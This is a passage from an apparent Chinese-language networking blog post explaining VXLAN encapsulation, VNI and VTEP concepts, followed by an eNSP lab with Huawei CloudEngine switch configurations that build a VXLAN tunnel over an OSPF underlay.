<p><strong>针对虚拟机规模受设备表项规格限制</strong></p>
<p>VXLAN将管理员规划的同一区域内的VM发出的原始报文封装成新的UDP报文，并使用物理网络的IP和MAC地址作为外层头，这样报文对网络中的其他设备只表现为封装后的参数。因此，极大降低了大二层网络对MAC地址规格的需求。</p>
<p><strong>针对网络隔离能力限制</strong></p>
<p>在传统的VLAN网络中，标准定义所支持的可用VLAN数量只有4000个左右。VXLAN引入了类似VLAN ID的用户标识，称为VXLAN网络标识VNI（VXLAN Network Identifier），由24比特组成，支持多达16M的VXLAN段，有效得解决了云计算中海量租户隔离的问题。</p>
<p><strong>针对虚拟机迁移范围受限</strong></p>
<p>VXLAN将VM发出的原始报文进行封装后通过VXLAN隧道进行传输，隧道两端的VM不需感知传输网络的物理架构。这样，对于具有同一网段IP地址的VM而言，即使其物理位置不在同一个二层网络中，但从逻辑上看，相当于处于同一个二层域。即VXLAN技术在三层网络之上，构建出了一个虚拟的大二层网络，只要虚拟机路由可达，就可以将其规划到同一个大二层网络中。这就解决了虚拟机迁移范围受限问题。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/5448c00ff2b14df88b112f3ee7923c6c.jpg" alt="img"  /></p>
<h3 id="vxlan与vlan之间的区别">VxLAN与VLAN之间的区别</h3>
<p>VLAN是传统的网络隔离技术，在标准定义中VLAN的数量只有4096，无法满足大型数据中心的租户间隔离需求。另外，VLAN的二层范围一般较小且固定，无法支持虚拟机大范围的动态迁移。</p>
<p>VXLAN完美地弥补了VLAN的上述不足，一方面通过VXLAN中的24比特VNI字段，提供多达16M租户的标识能力，远大于VLAN的4096；另一方面，VXLAN本质上在两台交换机之间构建了一条穿越数据中心基础IP网络的虚拟隧道，将数据中心网络虚拟成一个巨型“<strong>二层交换机</strong>”，满足虚拟机大范围动态迁移的需求。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210202234615267.png" alt="image-20210202234615267"  /></p>
<ul>
<li>
<p>VXLAN Header</p>
<p>增加VXLAN头（8字节），其中包含24比特的<strong>VNI</strong>字段，用来定义VXLAN网络中不同的租户。此外，还包含<strong>VXLAN Flags</strong>（8比特，取值为00001000）和两个保留字段（分别为24比特和8比特）。</p>
</li>
<li>
<p>UDP Header</p>
<p>VXLAN头和原始以太帧一起作为UDP的数据。UDP头中，目的端口号（VXLAN Port）固定为4789，源端口号（UDP Src. Port）是原始以太帧通过哈希算法计算后的值。</p>
</li>
<li>
<p>Outer IP Header</p>
<p>封装外层IP头。其中，源IP地址（Outer Src. IP）为源VM所属VTEP的IP地址，目的IP地址（Outer Dst. IP）为目的VM所属VTEP的IP地址。</p>
</li>
<li>
<p>Outer MAC Header</p>
<p>封装外层以太头。其中，源MAC地址（Src. MAC Addr.）为源VM所属VTEP的MAC地址，目的MAC地址（Dst. MAC Addr.）为到达目的VTEP的路径中下一跳设备的MAC地址。</p>
</li>
</ul>
<h2 id="实验创建一个vxlan网络">实验：创建一个VxLAN网络</h2>
<p>实现网络拓扑图，使用VXLAN在两台TOR交换机之间建立了一条隧道，将服务器发出的原始数据帧加以“包装”，好让原始报文可以在承载网络（比如IP网络）上传输。当到达目的服务器所连接的TOR交换机后，离开VXLAN隧道，并将原始数据帧恢复出来，继续转发给目的服务器。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/9aae9ee2cc864c6793e6a93792426a98.jpg" alt="https://download.huawei.com/mdl/image/download?uuid=9aae9ee2cc864c6793e6a93792426a98"  /></p>
<h3 id="什么是vxlan-vtep">什么是VXLAN VTEP</h3>
<p>VXLAN隧道端点，VTEP（VXLAN Tunnel Endpoints）是VXLAN网络的边缘设备，是VXLAN隧道的起点和终点，VXLAN对用户原始数据帧的封装和解封装均在VTEP上进行。</p>
<p>VTEP是VXLAN网络中绝对的主角，VTEP既可以是一台独立的网络设备（比如华为的CloudEngine系列交换机），也可以是在服务器中的虚拟交换机。源服务器发出的原始数据帧，在VTEP上被封装成VXLAN格式的报文，并在IP网络中传递到另外一个VTEP上，并经过解封转还原出原始的数据帧，最后转发给目的服务器。</p>
<h3 id="什么是vxlan-vni">什么是VXLAN VNI</h3>
<p>VNI（VXLAN Network Identifier，VXLAN 网络标识符），VNI是一种类似于VLAN ID的用户标识，一个VNI代表了一个租户，属于不同VNI的虚拟机之间不能直接进行二层通信。在VXLAN报文封装时，给VNI分配了24比特的长度空间，使其可以支持海量租户的隔离。</p>
<ul>
<li>二层VNI是普通的VNI，以1：1方式映射到广播域BD，实现VXLAN报文同子网的转发。</li>
<li>三层VNI和VPN实例进行关联，用于VXLAN报文跨子网的转发（三层VNI的工作详情将在另外一篇EVPN相关的文档中展开描述）。</li>
</ul>
<p>VNI的出现，就是专门解决以太网数据帧中VLAN只占了12比特的空间，这使得VLAN的隔离能力在数据中心网络中力不从心的问题</p>
<h3 id="完成vxlan网络架构">完成VxLAN网络架构</h3>
<p>使用VxLAN完成192.168.100.1 和 192.168.100.2之间的互联互通。模拟器使用eNSP、Underlay网络使用OSPFv2、Overlay使用VxLAN。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210203000139766.png" alt="image-20210203000139766"  /></p>
<h4 id="ensp中配置vxlan">eNSP中配置VxLAN</h4>
<p>在eNSP中只有华为的CE设备（CloudEngine系列交换机）支持VxLAN</p>
<p><strong>SW1</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system-view
</span></span><span class="line"><span class="cl">sysname SW1
</span></span><span class="line"><span class="cl">vlan 10
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl">port link-type trunk
</span></span><span class="line"><span class="cl">port trunk allow-pass vlan all
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/2
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dis ip interface brief 
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>SW2</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system-view
</span></span><span class="line"><span class="cl">sysname SW2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">vlan 10
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/1
</span></span><span class="line"><span class="cl">port link-type trunk
</span></span><span class="line"><span class="cl">port trunk allow-pass vlan all
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/2
</span></span><span class="line"><span class="cl">port link-type access
</span></span><span class="line"><span class="cl">port default vlan 10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dis ip interface brief 
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>CE1</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">system-view
</span></span><span class="line"><span class="cl">sysname CE1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bridge-domain <span class="m">10</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GE1/0/0
</span></span><span class="line"><span class="cl"><span class="c1"># 因为CE设备默认关闭了端口</span>
</span></span><span class="line"><span class="cl">undo shutdown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 将接口模式设置为2层模式</span>
</span></span><span class="line"><span class="cl">interface GE1/0/0.10 mode l2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 数据包的封装</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 路由器上配置trunk的封装协议的命令</span>
</span></span><span class="line"><span class="cl"><span class="c1"># dot1q中继封装，10指的是vlan 10</span>
</span></span><span class="line"><span class="cl">encapsulation dot1q vid <span class="m">10</span>
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">quit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 桥接域，连接两个不同的网段使用</span>
</span></span><span class="line"><span class="cl">bridge-domain <span class="m">10</span>
</span></span><span class="line"><span class="cl">vxlan vni <span class="m">10</span>
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 将bg桥与端口关联</span>
</span></span><span class="line"><span class="cl">interface GE1/0/0.10
</span></span><span class="line"><span class="cl">bridge-domain <span class="m">10</span>
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### </span>
</span></span><span class="line"><span class="cl">interface GE1/0/1
</span></span><span class="line"><span class="cl"><span class="c1"># 关闭默认交换口，二层设备无法配置IP地址</span>
</span></span><span class="line"><span class="cl">undo portswitch
</span></span><span class="line"><span class="cl">undo shutdown
</span></span><span class="line"><span class="cl">ip address 172.16.0.1 255.255.255.0
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 配置ospf</span>
</span></span><span class="line"><span class="cl">interface LoopBack0
</span></span><span class="line"><span class="cl">ip address 1.1.1.1 255.255.255.255
</span></span><span class="line"><span class="cl">quit
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">ospf router-id 1.1.1.1
</span></span><span class="line"><span class="cl">area 0.0.0.0
</span></span><span class="line"><span class="cl">network 0.0.0.0 255.255.255.255
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 创建VxLAN隧道</span>
</span></span><span class="line"><span class="cl">interface Nve1   <span class="c1"># 创建逻辑接口NVE 1</span>
</span></span><span class="line"><span class="cl"><span class="nb">source</span> 1.1.1.1   <span class="c1"># 配置源VTEP的IP地址（推荐使用Loopback接口的IP地址）</span>
</span></span><span class="line"><span class="cl"><span class="c1">## vni 10的头端复制列表为对端</span>
</span></span><span class="line"><span class="cl">vni <span class="m">10</span> head-end peer-list 2.2.2.2
</span></span><span class="line"><span class="cl">commit
</span></span></code></pre></td></tr></table>
</div>
</div><p>CE2</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">system-view
</span></span><span class="line"><span class="cl">sysname CE2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface GE1/0/0
</span></span><span class="line"><span class="cl"><span class="c1"># 因为CE设备默认关闭了端口</span>
</span></span><span class="line"><span class="cl">undo shutdown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 将接口模式设置为2层模式</span>
</span></span><span class="line"><span class="cl">interface GE1/0/0.10 mode l2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 数据包的封装</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 路由器上配置trunk的封装协议的命令</span>
</span></span><span class="line"><span class="cl"><span class="c1"># dot1q中继封装，10指的是vlan 10</span>
</span></span><span class="line"><span class="cl">encapsulation dot1q vid <span class="m">10</span>
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">quit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 桥接域，连接两个不同的网段使用</span>
</span></span><span class="line"><span class="cl">bridge-domain <span class="m">10</span>
</span></span><span class="line"><span class="cl">vxlan vni <span class="m">10</span>
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 将bg桥与端口关联</span>
</span></span><span class="line"><span class="cl">interface GE1/0/0.10
</span></span><span class="line"><span class="cl">bridge-domain <span class="m">10</span>
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### </span>
</span></span><span class="line"><span class="cl">interface GE1/0/1
</span></span><span class="line"><span class="cl"><span class="c1"># 关闭默认交换口，二层设备无法配置IP地址</span>
</span></span><span class="line"><span class="cl">undo portswitch
</span></span><span class="line"><span class="cl">undo shutdown
</span></span><span class="line"><span class="cl">ip address 172.16.0.2 255.255.255.0
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 配置ospf</span>
</span></span><span class="line"><span class="cl">interface LoopBack0
</span></span><span class="line"><span class="cl">ip address 2.2.2.2 255.255.255.255
</span></span><span class="line"><span class="cl">quit
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">ospf router-id 2.2.2.2
</span></span><span class="line"><span class="cl">area 0.0.0.0
</span></span><span class="line"><span class="cl">network 0.0.0.0 255.255.255.255
</span></span><span class="line"><span class="cl">commit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 创建VxLAN隧道</span>
</span></span><span class="line"><span class="cl">interface Nve1   <span class="c1"># 创建逻辑接口NVE 1</span>
</span></span><span class="line"><span class="cl"><span class="nb">source</span> 2.2.2.2   <span class="c1"># 配置源VTEP的IP地址（推荐使用Loopback接口的IP地址）</span>
</span></span><span class="line"><span class="cl"><span class="c1">## vni 10的头端复制列表为对端</span>
</span></span><span class="line"><span class="cl">vni <span class="m">10</span> head-end peer-list 1.1.1.1
</span></span><span class="line"><span class="cl">commit
</span></span></code></pre></td></tr></table>
</div>
</div><p>实验文件</p>
<p><a href="......%5Cimages%5Cvxlan%5Cvxlan.zip">vxlan.zip</a></p>
<p><a href="......%5Cimages%5Cvxlan%5Cvtep_g1_0_0.pcapng">vtep_g1_0_0.pcapng</a></p>
<p><a href="......%5Cimages%5Cvxlan%5Cvtep_g1_0_1.pcapng">vtep_g1_0_1.pcapng</a></p>
<h2 id="reference">reference</h2>
<p><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1100087027#ZH-CN_TOPIC_0254803584">huawei_vxlan_guide</a></p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
